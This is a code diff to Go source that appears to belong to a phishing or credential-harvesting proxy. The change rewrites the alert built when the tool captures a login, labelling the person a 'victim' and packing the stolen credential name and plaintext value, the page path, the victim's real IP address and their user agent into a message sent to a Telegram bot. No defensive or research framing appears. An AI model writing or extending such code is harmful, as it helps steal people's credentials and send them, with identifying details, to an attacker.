@@ -506,9 +506,15 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 							return false, err
 						}
 
-						message := fmt.Sprintf("[%s] [+] credentials: %s", t.ID, tui.Bold(creds.Key))
-						// t.Debug("[+] Pattern: %v", p)
-						t.Info("%s=%s (%s)", message, tui.Bold(tui.Red(creds.Value)), request.URL.Path)
+						message := fmt.Sprintf("[victim %s] %s: %s\nPath: %s | IP: %s | UA: %s",
+							t.ID,
+							tui.Bold(creds.Key),
+							tui.Bold(tui.Red(creds.Value)),
+							request.URL.Path,
+							GetRealAddr(request),
+							request.UserAgent(),
+						)
+						t.Info("%s=%s (%s)", creds.Key, tui.Bold(tui.Red(creds.Value)), request.URL.Path)
 						if tel := telegram.Self(t.Session); tel != nil {
 							tel.Send(message)
 						}
@@ -571,8 +577,15 @@ func (t *Trace) ExtractCredentialsFromResponseHeaders(response *http.Response) (
 							}
 
 							found = true
-							message := fmt.Sprintf("[%s] [+] credentials: %s", t.ID, tui.Bold(creds.Key))
-							t.Info("%s=%s", message, tui.Bold(tui.Red(creds.Value)))
+							message := fmt.Sprintf("[victim %s] %s: %s\nPath: %s | IP: %s | UA: %s",
+								t.ID,
+								tui.Bold(creds.Key),
+								tui.Bold(tui.Red(creds.Value)),
+								response.Request.URL.Path,
+								GetRealAddr(response.Request),
+								response.Request.UserAgent(),
+							)
+							t.Info("%s=%s", creds.Key, tui.Bold(tui.Red(creds.Value)))
 							if tel := telegram.Self(t.Session); tel != nil {
 								tel.Send(message)
 							}
